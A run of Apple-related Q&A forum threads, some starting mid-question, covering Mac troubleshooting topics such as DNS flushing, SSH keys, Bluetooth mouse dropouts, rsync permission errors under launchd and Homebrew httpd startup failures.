I would appreciate it if there would be a fix to that.\n\nA: As you mentioned in your comment, it works sometimes. Then, I would recommend to flush DNS of your MacBook and try it again as a first step. \nFlush the DNS cache by typing:\n  dscacheutil -flushcache\n\nForget network and try to connect it back. \nOther professional steps to know more on it:\nRun Apple Diagnostics:\nIf you still haven't solved your Wi-Fi worries you could use Apple Diagnostics to check for Wi-Fi or network issues.\nTo do so follow these steps:\n\n\n*\n\n*Disconnect all external devices (except the keyboard and screen).\n\n*Shut down the Mac, then turn it on while pressing and holding D.\n\n*When you see the screen asking you to choose your language do so, then watch as the progress bar indicates that your Mac is being assessed. This takes 2-3 minutes.\n\n\nIf problems are identified, Apple Diagnostics will suggest solutions.\nReset your SMC, PRAM or NVRAM\nReset the PRAM and the SMC (System Management Controller) is worth a try. This process is covered here: How to reset your Mac's NVRAM, PRAM, and SMC.\nI suggest you try this step as a last option. \nHowever, flushing DNS should work if your network is working sometime then. \n", "Q: No prompt for ssh passphrase I have two ssh keys, one for git (gitlab) and one for a server.\nMy ~/.ssh/config is :\nHost private\n  HostName x.x.x.x\n  User username\n  IdentityFile ~/.ssh/server\n\nHost git.example.com\n  IdentityFile ~/.ssh/gitlab\n\nHowever when I try ssh username@x.x.x.x or git commands I just have a message Permission denied (public key).

However, when traveling to some countries I experience connectivity issues. \nEg. in the US I get no reception at all, whereas in Ireland I get 4G connection which works well for data, but can't seem to place voice calls most of the time - when it works occasionally, the call gets dropped after about 30 sec following weird garbled sounds. When I visited France on the other hand, I experienced no issues at all.\nI might add that this is not a problem with my service provider as I have tried several SIM cards (even bought local ones) which all exhibit the same issue.\nThis leads me to believe that it might be an issue specific to band frequencies, but I understand too little about the subject to troubleshoot the issue. Has anyone had similar experience and can point me in the right direction or the right (focused on mobile tech or similar) forum to ask?\n\nA: You are right. There are about three different models of the iPhone X, each supporting the cellular networks of different regions of the world.\nAccording to GSM Arena https://www.gsmarena.com/apple_iphone_x-8858.php, they are:\n\n\n*\n\n*A1865 (USA, Hong Kong, Australia, New Zealand, China)\n\n*A1901 (EMEA, UAE, LATAM, Canada, USA - AT&T/T-Mobile, Singapore)\n\n*A1902 (Japan), A1903 (Unknown market)\n\n\nYou can see that all of Europe uses Model A1901, which is probably the one you own. If you get a T-Mobile SIM card in the U.S., it should work with that model, as well.\nTo check which iPhone model you have, you can navigate to:\nSettings > General > About and tap on the Model Number line to make the Model number appear.\nIt's the same with the newest iPhone 11 (Pro).

I.e., if a finder window has a mix of .jpg, .png and .webp files, the script finds the one file that is selected (such as a .jpg) and then selects all .jpg files.\ntry\n    tell application \"Finder\" to set the source_folder ¬\n        to (folder of the front window) as alias\non error -- no open folder windows\n    --set the source_folder to path to desktop folder as alias\n    --problem is a window can be open but out of focus\n    beep\nend try\n\ntell application \"Finder\"\n    set selectionList to {} & selection as list\n    set selectedCount to count items in selectionList\n\n    if selectedCount > 0 then\n        set nameExtension to name extension of item 1 in selectionList\n        select (every item where name extension ¬\n            is nameExtension) of (folder source_folder)\n    end if\nend tell\n\nHow would I modify this so it works with an application like the FTP client Transmit? Transmit is Applescript aware and appears in the Applescript Dictionary.\nOf course, simply changing tell application \"Finder\" to tell application \"Transmit\" doesn't work, since source_folder throws an error as it's looking for a finder window and not an application window.\n\nA: Here is the scripting definition file for the latest version of Transmit, downloaded today from the Panic homepage.\n\nTransmit.app AppleScript Terminology\n\nConclusion: Having read through the terminology and running a few brief tests in Script Editor to pass the time in an Apple Store, I highly suspect it is not possible to use AppleScript to select files in a Transmit file browser.\nJustification: Most notably, there is no command that is called select, or with a name indicative of a similar function. Also lacking is any property belong to any element or class object that sounds like selected or selection.\nThere is a class of object belonging to a file browser called a selected browser item. This, as you may be able to guess, is an object reference to the currently selected file(s) in the file browser. Therefore, it is possible to retrieve a list of files currently selected:\ntell application id \"com.panic.Transmit\"\n    tell the front document\n        if not (exists) then return null\n        tell the current tab\n            tell the local browser\n                get the name of every selected browser item\n            end tell\n        end tell\n    end tell\nend tell\n\nAny attempts to set the selected browser items either collectively or individually by index was unsuccessful. \n Invoking the make command to create a new selected browser item also failed.\nSorry that this might not be the answer you were hoping for.\n", "Q: How can an iPad in airplane mode detect iOS update? I have an iPad Air 2. It only has Wi-Fi capability and I keep it in airplane mode as I don't want it linking to my iPhone or other Apple accounts and disrupting any in progress memo recordings.\nWell, the iPad has been in airplane mode for the last 1 week. This morning I saw on my iPhone that an update was available so I went ahead with that update. When I accessed my iPad to update and went into settings to turn off airplane mode I noticed that it had already detected that an update was available!\nHow is that even possible when it had been in airplane mode all week?\n\nA: By default Airplane mode disables all wireless frequencies on your device so that you can comply with airline regulations. This means that any radio frequencies relating to cellular, Wi-Fi and Bluetooth are disabled.\nHowever, when your device is in Airplane mode, it is actually possible to manually enable Wi-Fi and/or Bluetooth. And, if you do, the next time you're in Airplane mode these settings remain.\nSo, the most likely answer is that at some point you activated Wi-Fi during Airplane mode (either intentionally or by accident) and that ever since your iPad has sill been connected via Wi-Fi whenever you've activated Airplane mode.\nAs per Apple:\n\nUse Wi-Fi and Bluetooth in Airplane Mode\nIf the airline allows it, you can use Wi-Fi and Bluetooth while in\nAirplane mode. You just need to turn them on separately. On your\niPhone, iPad, or iPod touch, you can turn on Wi-Fi or Bluetooth with\nControl Center. Open Control Center from the Home screen and tap [the Wi-Fi or Bluetooth icon]. You can also go to Settings > Wi-Fi or Settings > Bluetooth. To use\nWi-Fi and Bluetooth on your Apple Watch, just turn off Airplane Mode.\nIf you turn on Wi-Fi or Bluetooth while you're in Airplane mode, they\nwill be on the next time you use Airplane mode, unless you turn them\noff while in Airplane mode.\n\nSource: Use Airplane Mode on your iPhone, iPad, iPod touch, and Apple Watch, Apple. [Bold emphasis mine, words in italics added for clarification]\nThe following screenshot is from an iPad in Airplane Mode and connected to Wi-Fi at the same time:\n\nRelated reading\n\n*\n\n*Use Bluetooth and Wi-Fi in Control Center with iOS 11 and later\n", "Q: How to remap right Control key to Command/apple key?

I have a table like this,\n\nI need to sum all fields above (exclude the header), the following formula works:\n=SUM(C1:C5)\n\nWhen I add more rows I must rewrite the formula, then I tried something like this:\n=SUM(C)\n\nBecause there's a header in column C, SUM function failed as expected.\nWhat should I use? Number does not support =SUM(ABOVE) and MS Excel is as stuck as it can be.\n\nA: When putting a sum-over-the-entire-column formula into a regular cell, you are basically self-referencing the formula cell as a value cell.\nTry putting the the formula into a footer row. This way you can reference only the cells in a column without including the header or footer row.\n\n\n*\n\n*Add a footer row in the \"Header & Footer\" section in the Format > Table sidebar\n\n\n\n\n\n*Put the SUM formula in the footer row (the last row in the image below) and select the entire column by referencing the column letter or the column header title (column header title here is \"Header\" :).\n\n\n(Select footer cell, type \"=SUM\", press Enter, type header title or column letter, press Enter)\n\nAs shown, only the cells, without the header or footer row, are selected. The sum is calculated over all cells in the column, even when adding new rows.\n\nA: SUM(INDIRECT(ADDRESS(2,COLUMN(),4)&\":\"&ADDRESS(ROW()−1,COLUMN(),4), 1))\nWhere 2 is the first row after headers to be summed\n\nA: Using version 5.1 (5683), to my (limited) knowledge of Numbers, there is not an equivalent of the Excel =SUM(ABOVE) formula in Numbers.\nIf you primarily want to use the keyboard, start by adding a keyboard shortcut for the SUM formula in Numbers in System Preferences > Keyboard > Shortcuts > App Shortcuts as shown in the image further below.\nI gave it: ^S\nNow, in Numbers, you can sum any column above the selected cell by pressing: ^S\nIf you then need to extend the number of cells beyond the cell that has the SUM formula, simple do the following:\n\n*\n\n*Select the cell that contains the SUM formula and press the delete key.\n\n*Fill in the values of the empty cells as needed.\n\n*Press: ^S\nYou now have a new sum for all cells above the selected cell you want the SUM formula in.\n\n\nThe shortcut is: Control-S\n\nA: You can define your expression by writing = sum( and then clicking with your cursor on the first row you want to include and then dragging the cursor down to the last row. This is much simpler than writing the values in.\nBelow is an image of a sum expression.\n\nThe only thing I actually typed was the characters = sum(.

I also have a PCIe m2 to USB enclosure that I used to first allocate a FAT32 partition on the drive. I also made a bootable USB macOS High Sierra install disk using a virtual Mac. Now I have the EVO 970 installed in my Mac and the boot drive. The boot drive boots to a Utilities screen with options to install macOS etc. \nI formatted the EVO 970 installed in the Mac as a Mac OS Extended (Journaled) disk with the GUID Partition Map scheme. I then proceeded to use the Install macOS option, but I am unable to click on the 970 EVO drive because it says I am missing firmware for this drive. \nI have not updated this Mac past Mac OS X El Capitan before and I am trying to install macOS High Sierra so my Mac will boot from the new SSD. \nWhat am I doing wrong?\n\nA: start again:\nformat the new ssd when still outside the mac (you need an cable to usb). Forget all software that came on the disk: all has to go with the format.\nNow use a clone app on the mac, like CarbonCopyCloner, to make a clone of your actual disk with everything on it to the still external disk.\nWhen that is ready, shutdown the mac.\nRestart while holding the Alt/Option key: the startup menu is displayed: choose the new external disk: when it starts correctly and all is well:\nshutdown again, open the mac, take out the \"old\" disk and put in the new disk, be very careful with the connectors.\nClose the mac correctly, startup normally and are ready to continue where you were.\nEDIT: it may be that the ssd connection is soldered: then of course you can not do it what I explained.\n", "Q: Why the same MacMini provides different MAC addresses for different OS?

However, since updating to the latest beta, I have several major issues:\n\n\n*\n\n*Item dragging is not working. I've tried three-finger drag in Finder on built-in trackpad and using Logitech MX Master mouse. It simply selects the file and doesn't move the file as I move the mouse cursor. \n\n*Safari hangs very often, especially when editing text. I have to Force Quit it every couple minutes. I've tried disabling all extensions and clearing Caches from Develop menu. (FWIW Chrome works perfectly good).\n\n*Same in Mail app, when I try add a new mail account. When I edit texts in Mail Preferences window, the app hangs.\n\n*I can't download any new apps from the Mac App Store.

I don't have any previous backups.\nI've tried restarting my Mac, resetting SMC and doing some cleanup with CleanMyMac but no luck. What can I do, preferably without restoring my system?\n\nA: I was having the same issue, and I just reinstalled the beta by going here: https://developer.apple.com/download/ then clicking \"Install Profile\" on Catalina. Then went to software update, and it started downloading Catalina again. Everything's fine now (no hanging, dragging works, etc.).\n\nA: Beta software are supposed to be for testing purposes. Specifically BetaOS is released publicly for tech enthusiasts only and that's absolutely not recommended to install on anyone's primary machine. \nIt seems like Apple is trying to force use of firewall which is creating trouble for Internet related apps (Chrome, Mail, Safari). You can investigate with following. \n0) Fist Check your DNS settings. Sometimes your ISP provided DNS sucks. Use Google DNS (8.8.8.8, 8.8.4.4 etc)\n1) Check Firewall and proxy settings in your Settings app.\n2) You can investigate your hosts file sudo nano /etc/hosts (Careful: You need to know what you're doing.)\n3) Just assume Apple is outdating your system :D\n4) Chances are Apple enabled several Debug Logs to test the Beta 8. they'll turn it off with final release.

They are all JPG/RAW pairs.\nThe photos display with the little J icon in the top right corner but the Image > Use RAW as Original option in the menu is greyed out. I'm pretty sure I had this working in the past. \nIf I dig into the Photo Library with the terminal I can see that the ORF (Olympus RAW Format) and DNG (Digital Negative) files are there. I just cannot access them from Photos app.\nMy library is an iCloud Photo Library and on iOS if I use apps that know about RAW files, such as Darkroom, they are able to open the RAW versions.

If I have arranged Finder to the left of the desktop and Slack to the right, and have Sketch further to the right, there's a reason for that. It's an organization strategy to make my work easier and keep track of the many windows I have open. BUT, macOS rearranges them if I click on the application icon from the Dock and rather than swiping over to the screen in the specified order, it moves it next the Desktop.\nIs there a way to stop that from happening?

Got an SMS with validation code, validated the thing, and now the phone is associated there. So far so good.\nThen I've signed off & on of FaceTime, restarted the Mac, to no avail: in FaceTime preferences, the number does not appear.\nIs it simply because FaceTime requires an iPhone and there's no way around it? (The support page does not tell this)\nOr am I missing something?\nI'm on macOS 10.15 Catalina beta, as a developer I needed this to work with latest Xcode beta features.\n\nA: \nCan I be reached on FaceTime on Mac using my non-iPhone phone number?\n\nNo. You need an iPhone to do that.\n\nI've added my phone number to my Apple ID\n\nWhat you have done is associated your mobile number with your Apple ID. The mobile number can be used to receive verification code when logging in with your Apple ID (if you do not have an active trusted device).\nUsing FaceTime with your mobile number requires the mobile number to be registered with the FaceTime service. You are prompted to register the mobile number when you use your mobile number with an iPhone.\n\nP.S.\nThere's a workaround that you can attempt. You can temporarily insert the SIM card in an iPhone. The iPhone will prompt you to register the number with FaceTime service (which it does by sending an MMS). Note that your service operator may charge for the MMS.\nOnce the number is registered with the FaceTime service, you can configure the FaceTime app on your Mac such that you can be reached on FaceTime via your mobile number. Do note that if the iPhone is set up with a different or someone else's Apple ID, make sure you ignore any alert to associate the mobile number with that Apple ID.\nOnce setup, you can remove the SIM card from the iPhone and continue to use it normally. Note that this isn't a full-proof, official or recommended approach. You are advised to proceed with caution.\nSuch workarounds aren't recommended and you can best experience all the service offerings by Apple if you stick to the platform.\n\nA: You are correct - there’s no activation path on macOS and Messages / FaceTime only absorb a phone number when it’s not assigned to an iPhone used to sign in to your iCloud account. \nYou added a multi factor sms and not a reachable link via FaceTime (good effort here BTW it was worth a shot). \nTo do what you seek, get that number on a SIM and into an iPhone to link the phone number to your AppleID by activating FaceTime or messages on an iOS. You can then test how long that persists when you swap that sim back to your preferred mobile device OS or just put your other mobile number on iOS. \n\n\n*\n\n*https://support.apple.com/en-us/HT204408\n\n*https://support.apple.com/en-us/HT204380\n", "Q: sync iBooks page currently reading between iPhone and MacBook I have a MacBook Pro (Retina, 15-inch, Mid 2015) (macOS Mojave 10.14.6) and an iPhone 7 (iOS 12.4.1).\nI downloaded an ebook from the internet, and started reading it on my MacBook.\nA few days later I copied it onto my iPhone (using iTunes on my MacBook when my iPhone was connected).\nI thought bookmarks would sync between the two devices, so I could continue reading on one device from where I left off on the other.\nUnfortunately that isn't happening.\nHow can I keep my two books in-sync?\n\nA: To control some settings of Apple Books on your iOS device, you need to have iCloud Drive turned on: Go to Settings > [your name] > iCloud and turn on both iCloud Drive and Books. Then go to Settings > Books.\nUnder Syncing, you can change settings like these:\n\n\n*\n\n*Turn on Reading Now to sync your reading progress, current book, notes, and bookmarks using your iCloud account. Reading Now only syncs to other iOS devices, not your Mac.\nTurn on iCloud Drive to sync PDFs, EPUBs, and books created with iBooks Author that you didn't purchase from the Book Store that you added to your Library across all of your devices.\n\n*Under Allow Books To Access, turn on Cellular Data to stream books while your iPhone or iPad is connected to the Internet via a cellular connection and using cellular data.\nYou can also change settings in the Books app. Tap Reading Now, then tap the Profile icon or your picture in the upper-right corner. From here, you can redownload your purchases, access Family Purchases, and redeem gift cards or content codes.\n\nA: While reading position sync to macOS is not supported, literal bookmarks (bookmark icon) do sync between iOS and Mac over iCloud. So if you don't mind modeling the analog world, you can set a bookmark when you stop reading on one device and go to it on the other. It can take a minute or two to sync, as is typical with iCloud.\nOn the Mac side, turn on Books in System Preferences > Internet Accounts > iCloud > [Options...]. Then in the Books app on the Mac, in General Preferences, check \"Sync collections, bookmarks, and highlights across devices\".\nFor the iOS side, see Udhy's answer.\nReference: iPad User Guide (iOS 15.4) (in Books!), tested on macOS 11.6.5 (Big Sur)\n\nA: With Apple Books it is not possible to sync reading progress between iPhone and a Mac.\nThe Apple Books \"Reading Now\" feature only works on and between iOS devices and not between iOS and MacOS.\n", "Q: Proper save format for preview for editable pictures Suppose you edit a picture in Preview and added new elements such as text.

I just bought new monitor (LG 24UD58-B) because of my MacBook's flexgate issue (when you can't really open lead). I can't bring it to service yet, because where I live it takes up to 5 weeks and it's my working computer.\nFor some reason I experience very laggy behavior while running in retina mode, it's definitely not 60 fps, probably closer to 25-30. It seems that the problem is in CPU spikes because other movements like moving the cursor and scrolling are fine sometimes. It is happening in all applications.\nI'm using default hidpi mode, so no additional scaling is present. Laptop is working with closed lid. System is High Sierra.\nCurrently it is connected it with noname usb-c → displayport cable (the only I could get in my country).\nCould the actual cable be the reason of the lag / slow performance?\nCan I check somehow whether it's CPU vs cable? Because from apple site it seems that my model should handle 4k just fine.\nThe problem is I can't really check with another cable unless I order another one from amazon which ship around two weeks. I would probably better to return the monitor before that. I can just buy 1080p monitor for half of the price then.\nI also tried running with HDMI adapter and it works pretty smooth in low resolution mode. I have small lag with the current cable even in low-resolution mode.\n\nA: So, if I read your question, and understood it correctly, you are using a USB-C cable to connect your screen to your machine?\nThe thing is that a USB-C type cable is not the other!\nThere are a lot of differences in USB-C cables so you have to be sure that your cable supports what you want it to do.\nIf the cable's bandwidth is not sufficient for supporting 4K it can result in lags as you explain.\n", "Q: \"Hey Siri\" suddenly stopped working on MacOS Mojave Siri works perfectly after I manually click on the Siri icon on my TouchBar or click on the menu bar Siri icon so there is no issue with my microphone.\nAlso there are no user accounts to manage in my Parental Controls Preferences.\nHowever it does not start when I speak \"Hey, Siri\".\nI have tried the following:\n\n\n*\n\n*Unchecking and checking listen for \"Hey, Siri\"\n\n*Reset Ask Siri in System Preferences\n\n*Restart my Mac\n\n*Reset NVRAM\n\n*Reinstalling the OS\n\n\nNothing has worked.

For the first week everything was ok, but then my mouse began to lose connection with the computer. This happens very often (on average every two minutes) and is very annoying.\nI'm pretty sure that is not Magic Mouse fault, because I tried connect standard bluetooth mouse and the problem also occurs. \nIt looks something like this: works with the mouse, suddenly the cursor disappears. even though I move the mouse, nothing happens on the screen (the touchpad works correctly). After about 20 seconds a message about lost connection with the mouse appears and after 10 seconds a message that the mouse has been connected.\nAnd now the strangest thing: When bluetooth headphones are connected to the computer and I play audio, the problem does not occur. When the headphones are connected but I don't play music, the problem occurs but much less often.\nCould this be a problem with the bluetooth module? It is worth noting that the bluetooth keyboard works flawlessly. Please help, because it prevents me from working.\n\nDevices:\n\n\n*\n\n*MacBook Pro (15-inch, 2019)\n\n*macOS Mojave 10.14.6\n\n*Apple Magic Mouse 2 \n\n*Apple Magic Keyboard\n\n*Headphones Phillips SHB3075 Bass+ Bluetooth\n\n\nA: This shouldn't make a difference since you're talking about an Apple Magic Mouse 2 and not a 3rd party Bluetooth mouse, but one thing I have seen that does work in some cases is to make sure the mouse is the first Bluetooth device paired to your computer. \nTo do this you will need to reset both the macOS Bluetooth Device List and Bluetooth Controller. However, this will reset all connected Bluetooth devices, including your external keyboard and headphones.\nIn other words, this will remove all existing pairing information for Bluetooth devices, so each will need to be reconnected.\nI have some steps you can follow, but I strongly suggest you read all of the steps first before commencing (or perhaps print out the instructions / view them on another device).\nBefore starting, ensure you have the Bluetooth icon showing in the menu bar. If it is not there, open System Preferences > Bluetooth and enable the option Show Bluetooth in Menu Bar.\nAlso, since you're trying to resolve an issue with a Bluetooth mouse,  you will need to use your built-in trackpad to follow these steps:\n\n\n*\n\n*Hold down both the Shift and Option keys and at the same time click on the Bluetooth icon in the menu bar. Once the menu is showing, release the keys.    \n\n*From the Bluetooth menu, choose Debug > Remove All Devices\n\n*Hold down both the Shift and Option keys again and at the same time click on the Bluetooth icon in the menu bar. \n\n*From the Bluetooth menu,  choose Debug > Reset the Bluetooth Module\n\n*Shutdown your MacBook Pro\n\n*Ensure your Magic Mouse is fully powered off\n\n*Restart your MacBook Pro\n\n*Connect the Magic Mouse to your MBP via the USB cable\n\n*Now switch on your Magic Mouse\n\n*Now click on the Bluetooth icon in the menu bar and choose Open Bluetooth preferences...\n\n*When the Magic Mouse pairs with your Mac, it appears in the list of devices\n\n*Exit System Preferences\n\n\nNow test the Magic Mouse long enough to see if it works okay. Once you're satisfied it is, you can go ahead and pair your other devices.\nLet me know how you go.\n\nA: Although this sounds more like a software issue, I don't think it is impossible that you are dealing with issues related to signal interference. The 2.4 GHz frequency that Bluetooth uses is rather crowded and most notably WiFi can be on the same band and cause issues. \nI suggest to test your Wifi first. Press alt and click on the WiFi symbol. If under \"Channel\" it says 2.4 GHz, try switching your router to the 5 GHz band. \nIf that doesn't help, look for other sources of possible interference. Please find more troubleshooting suggestions on signal interference in Apple's support document and my answer here. \n\nA: I had the same problem and tried all the usual apple troubleshooting procedures. Nothing worked for me. Finally, I came across these posts by Michael Kummer and Brad Moon.\nTurning off Apple’s Handoff feature worked for me!\nFrom Brad Moon post:\n\nSimply open up your System Preferences, select General, look for a setting called Allow Handoff between this Mac and your iCloud devices and make sure it’s un-checked.\n\n\nYou lose the ability to start writing an e-mail on your iPhone then “hand it off” to automatically continue working on it in Mail on your Mac, but it might be worth sacrificing the feature to finally nail a maddening Bluetooth mouse problem.\n\n\nA: This person is also on Mojave, had similar problems, and seems to have tried all debugging steps I can think of. I suggest you follow those as well.\nSurprisingly updating Xcode helped him remedy (not solve) the issue: \n\nTo update Xcode, open your Terminal and enter xcode-select --install. You may have to delete the old version of Xcode before installing the latest Xcode. Make sure to also install the command line developer tools.\n\n", "Q: How to distinguish a terminal window currently connected via SSH? I'm coming from Windows, where I used to use Putty whenever I needed to connect to a server via SSH.\nOn MacOS this is much easier, as I can ssh into the server directly from the terminal. This is nice, but comes with a caveat: I might have a few terminal windows open at the same time, and mistake a terminal opened locally with a terminal ssh'ed into a remote server (and make nasty mistakes).\nIs there any way I can visually distinguish a terminal window connected via ssh, from another one on my local machine?\n\nA: Look to the title of the window, or the title of the tab if you are using several tabs:\n\n\nThat won't be enough for me to avoid making mistakes  – Benjamin\nI was thinking about something like the window changing color somewhere. Don't even know if that's technically possible, though. – Benjamin\n\nAssuming a worst case when you are unable to change remote's prompt, edit you mac's terminal prompt in order to make most clear if the terminal is at a client of a Mac of yours.\nIf you use Tmux, configure non defaults status-fg status-bg so that your Mac's local terminals use a different Tmux color than what is configured at your servers.\n\nA: If you are willing to set-up powerline, you could have a prompt which shows if you are currently logged into a ssh session. This would be hard to miss. \n", "Q: How to find the speed and CL settings of DDR3 SODIMM? I bought a pair of Crucial 8GB DDR3 1866MHz SODIMM for my iMac 27 5K Retina Late 2015.  I suspect the SODIMM that I received is 1600MHz, potentially counterfeit. \nHere is my question\n\n\n*\n\n*Is there any way to read the SPD data for the speed, CL settings, and manufacturer ID?\n\n*How do I find the actual speed.  Is the System Report -> Memory the actual speed or reading from SPD?  I need both information.\n\n*How do I check if it's a genuine Crucial memory? (EDIT: I called Crucial.  They said the material number 310536 isn't matching.  They are investigating)\nThe Crucial part number is CT102464BF186D.C16FN.\n\nThe marking on Micron DRAM chip is D9QBJ. \n\nAccording to Micron the part number is MT41K512M8RH-125:E. Here is the link for datasheet. -125 means 1.25nsec speed grade.  1/1.25nsec = 800MHz which is 1600MHz since DDR is \"double data rate\".\nFYI: Crucial web said CT102464BF186D is not compatible with Mac, but many people reported success and stable with their late 2015 iMac while small number of people reported random shutdown.  It's my wild guess they hit the counterfeit DIMM that has the SPD programmed for 1866MHz when the DRAM chips are 1600MHz rating.\n\nA: The RAM does appear to be counterfeit as far as I can see. \nI have that type of genuine Crucial memory (CT102464BF186D.C16FN) here - but it doesn't look like your picture.\nThe PCB is almost identical, but some markings on it are off. The number of components mounted at the top of the board are very much different. The actual DRAM IC on my memory has FPGA code C9BCM, which according to Micron is a 1.07 nsec rating - equalling a 1866 Mhz speed.\nTo top it off, the label looks very much the same - but instead of \"Product of China\", mine says \"Assembled in USA\". \nI can't say for sure that this means that it is counterfeit - it could be some kind of labelling/production error, or another revision of the same product or similar.\n", "Q: Xcode: Archiving a project to generate .ipa but export is not an option in Organizer I am a member of the Apple Developer program for my team and I have all the provisioning profiles in place and codesigning, but when I run Product -> Archive and get the Organizer pop-up, Export is not an available button for me.\nI only have Distribute App and Validate App available as buttons. I am unclear what to do from here since all the documentation I have seen online says there was supposed to be an Export button available.\nI am using Xcode 10.1 on High Sierra.\n\nA: So unless I am mistaken, with Xcode 10.1 on High Sierra at least, you will not find an Export button after running Product -> Archive in the process of generating an .ipa.\nWhen you get the pop-up Organizer, instead, you want to click on the Validate button and just follow the prompts, once successful, then you can click on the Distribute button which will direct you to a pop up prompt asking you for method of distribution.\n", "Q: rsync errors, but only when run in launchd I have a script which runs rsync on my ~/Library/Preferences/ folder:\n#!/bin/zsh -f\n\nSOURCE=\"$HOME/Library/Preferences\"\n\nTARGET=\"$HOME/Dropbox/Backups/Preferences/$HOST\"\n\nLOG=\"$HOME/logs/$HOST/${NAME}.log\"\n\n[[ ! -d \"$LOG:h\" ]] && mkdir -p \"$LOG:h\"\n\n[[ ! -e \"$LOG\" ]] && touch \"$LOG\"\n\n/usr/bin/rsync \\\n    --8-bit-output \\\n    --human-readable \\\n    --itemize-changes \\\n    --progress \\\n    --safe-links \\\n    --links \\\n    --times \\\n    --delete \\\n    --recursive \\\n    --checksum \\\n    --verbose \\\n    --exclude='.DS_Store' \\\n    --log-file=\"$LOG\" \\\n    \"${SOURCE}/\" \\\n    \"${TARGET}/\"\n\nexit 0\n#EOF\n\n\nThis script works with no errors from iTerm.\nHowever, when I try to run it via launchd I consistently get errors about 3 files:\n\n\n*\n\n*com.apple.homed.notbackedup.plist\n\n*com.apple.homed.plist\n\n*com.apple.mail-shared.plist\n\n\nHere's an example:\n\nbuilding file list ...\n511 files to consider\n*deleting com.contextsformac.Contexts.plist.JkbicFf\n.d..t.... ./\nrsync: send_files failed to open \"/Users/luomat/Library/Preferences/com.apple.homed.notbackedup.plist\": Operation not permitted (1)\nrsync: send_files failed to open \"/Users/luomat/Library/Preferences/com.apple.homed.plist\": Operation not permitted (1)\nrsync: send_files failed to open \"/Users/luomat/Library/Preferences/com.apple.mail-shared.plist\": Operation not permitted (1)\n>fc.t.... com.contextsformac.Contexts.plist\n       3.10K 100%    0.00kB/s    0:00:00 (xfer#4, to-check=249/511)\n.f..t.... com.setapp.DesktopClient.plist\n>fcst.... test-ignore.txt\n         203 100%  198.24kB/s    0:00:00 (xfer#5, to-check=75/511)\n\nsent 31.63K bytes  received 142 bytes  63.55K bytes/sec\ntotal size is 3.42M  speedup is 107.49\nrsync error: some files could not be transferred (code 23) at /BuildRoot/Library/Caches/com.apple.xbs/Sources/rsync/rsync-52.200.1/rsync/main.c(996) [sender=2.6.9]\n\n\nI assume this has something to do with Mojave's security because I have access to the files:\n\n$ ls -l com.apple.homed.* com.apple.mail-shared.plist\n-rw------- 1 luomat staff 184 Sep 12 00:43 com.apple.homed.notbackedup.plist\n-rw------- 1 luomat staff 567 Sep 13 09:53 com.apple.homed.plist\n-rw------- 1 luomat staff 225 Aug 18 23:44 com.apple.mail-shared.plist\n\n\nWhat I have tried\n\n\n*\n\n*I have given /usr/bin/rsync \"Full Disk Access\" in System Preferences\n\n*I have tried rsync from homebrew /usr/local/bin/rsync and given it \"Full Disk Access\"\n\n*I have given /sbin/launchd \"Full Disk Access\"\n\n\nNow what?\nGiven that it does not give any errors when not in launchd what should I try now?\n\nA: Your running in different contexts when you use launchd and iterm2.

You will have to reset the password for every account on the system or it won't let you proceed.\nThe really horrible thing about this new Apple \"security measure\" is that it allows malware authors to create accounts on your computer that you can't delete unless you know the procedure I outlined in the above.\nFollowup:\nThe reason for this is because the account that you want to reset the password for has a Secure Token set. If the account was created at the GUI level or at the command line using \"sysadminctl\", and was created as an admin account, then it most definitely has a Secure Token set.\nFollowup #2:\nNot all Macs will have the SecureToken enabled on all accounts, this is usually the case where the Mac originally came with some version of Mac OS prior to Catalina. No, root doesn't even have this token enabled. However, the SecureToken capability has been around since High Sierra and was set any time that Migration Assistant was used or if FileVault was ever enabled. If a Mac was upgraded to Catalina, the user who ran the upgrade will get the SecureToken set on their account even if somebody else has it too. Those users will be the only ones who can grant the token to other users or revoke it and this has to be done at the command line with sysadminctl, you will also need to know the password to any account that you intend to modify. As of Catalina, if you forget the password to any account with the SecureToken enabled, no other users can reset that account password unless you know the current password. In which case, you will have to reboot the Mac into recovery mode and reset the passwords for all user accounts. Thanks Apple! (NOT)\n\nA: I tried using\nsudo passed username\n\nand was also asked for the old password for username. I was able to change username’s password by rebooting the computer, getting into the Users & Groups preference pane, unlocking it with the admin user ID and password, and clicking on the Change Password… button.

You can modify find's maxdepth parameter for something like that:\nfind . -maxdepth 1 -type d -name \"*.app\" > Applications.txt\n\nIf you wish to search within all subdirectories of the current one, simply omit the -maxdepth option altogether.\nIf you have a problem with the pathname being part of the output (e.g., you want Terminal.app not ./Utilities/Terminal.app), then try this instead:\ncd /Applications\nfind * -type d -name \"*.app\" -exec basename \"{}\" \\; > Applications.txt\n\nIf you want to find any application anywhere on your Mac, try:\nmdfind -interpret \"kind:application\"  # this is localized for your language\n\nThe mdfind command uses Spotlight's index, so it's fast, but (being an index) it may not always represent the exact, up-to-the-minute state of the filesystem. How to remove the pathname from the front is left as an exercise for the reader (hint: xargs -I{} basename \"{}\").\n\nA: It might be easier to avoid the problem altogether by creating the text file outside the Applications folder. This will also make\nsure that the workflow works for users without write access there.

I'm trying to setup httpd with HomeBrew on a mac.\nAs I painfully learned today, brew services start always reports success, even when httpd fails to start.\nExample failures reported as success:\n\n\n*\n\n*failure to start httpd because another instance (started outside of brew) is already running;\n\n*failure to start httpd because of a syntax error in a config file\n\n\nFor example, say I deliberately put some random chars in httpd.conf, and run:\n$ sudo brew services restart httpd\n\nBrew happily reports success:\n==> Successfully stopped `httpd` (label: homebrew.mxcl.httpd)\nWarning: Taking root:admin ownership of some httpd paths:\n  /usr/local/Cellar/httpd/2.4.41_1/bin\n  /usr/local/Cellar/httpd/2.4.41_1/bin/httpd\n  /usr/local/opt/httpd\n  /usr/local/opt/httpd/bin\n  /usr/local/var/homebrew/linked/httpd\nThis will require manual removal of these paths using `sudo rm` on\nbrew upgrade/reinstall/uninstall.\n==> Successfully started `httpd` (label: homebrew.mxcl.httpd)\n\nEven though httpd is obviously not running:\n$ sudo ps -A |grep httpd\n 9481 ttys000    0:00.01 grep httpd\n (nothing else)\n\n$ sudo lsof -iTCP:80 -sTCP:LISTEN\n (nothing)\n\nWhat's wrong? Is this a bug in brew?\n\nA: Trying to debug Apache issues on any computer can be difficult, but you just have to know what commands and files to look at.  First, try to start Apache using the apachectl command and look for errors written to the screen. \n$ sudo apachectl start\n\nIf there is an error in the apache conf files or some system issue, you may see it there.   \nAlso, you need to review the log file and see what the service is writing about itself.  For homebrew, the log file is typically called -\n/usr/local/var/log/httpd/error_log\n\nOften, when I find that Apache won't start, it is because there is a pid lock file that makes Apache think another instance is already running and you will see this in the log file. Delete the lock file and try to start the 